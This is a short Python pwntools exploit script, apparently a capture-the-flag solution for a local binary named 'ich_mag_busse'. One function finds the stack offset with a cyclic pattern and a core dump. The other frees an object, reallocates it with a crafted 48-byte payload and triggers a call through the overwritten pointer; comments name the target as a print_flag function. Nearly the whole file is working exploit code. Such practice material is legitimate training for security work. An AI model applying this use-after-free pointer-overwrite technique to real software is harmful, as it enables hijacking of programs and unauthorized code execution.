#!/usr/bin/env python3
from pwn import *
import IPython

def analyse():
    io = process('./ich_mag_busse')
    print(io.recvregex(b'3. Loeschen\n'))
    #print to make sure lkw get's deleted
    io.sendline(b"2")
    print(io.recvregex(b'3. Loeschen\n'))
    
    #alloc to write new stuff
    io.sendline(b"1")
    length = 48
    #payload = length * b'A'
    payload = cyclic(length)
    io.sendline(str(length))
    io.sendline(payload)
    print(io.recvregex(b'3. Loeschen\n'))

    #print again to trigger function
    io.sendline(b"2")
    print(io.recvregex(b'3. Loeschen\n'))
    io.wait()
    core = io.corefile
    stack = core.rsp
    info("rsp = %#x", stack)
    pattern = core.read(stack, 4)
    rsp_offset = cyclic_find(pattern)
    info("rsp offset is %d", rsp_offset)
    IPython.embed()

def pwn():
    io = process('./ich_mag_busse')
    info("Ausgeben (to delete things")
    print(io.recvregex(b'3. Loeschen\n'))

    #print to make sure lkw get's deleted
    io.sendline(b"2")
    print(io.recvregex(b'3. Loeschen\n'))
    
    info("alloc to write new stuff")
    io.sendline(b"1")
    length = 48
    #payload = length * b'A'
    #POINTER = b'x\x15@\x00\x00\x00\x00\x00' #address of the function print_flag
    #SEATS = b'\x00' * 8
    #INT_5 = b'\x00' * 3 + b'\x05' + b'\x00' * 4
    #COLOR = b'\x46' * 5 + b'\x00' * 3
    #payload = POINTER + SEATS + POINTER + INT_5 + COLOR + b'\x41' * 8
    #payload = payload.replace(b'\x00', b'\xff')
    payload = b'\x00@=\x80\x00\x00\x00\x00\x00\x00\x00#\x00\x00\x00\x00\x00An\xd0\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00ualb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'    
    print(len(payload))
    assert(len(payload) == 48)
    io.sendline(str(length).encode())
    io.sendline(payload)
    print(io.recvregex(b'3. Loeschen\n'))

    info("print again to trigger function")
    io.sendline(b"2")
    io.wait()
    core = io.corefile
    IPython.embed()
    #print(io.recvregex(b'3. Loeschen\n'))
    io.recvline()
    io.recvline()
    io.recvline()

#analyse()
pwn()
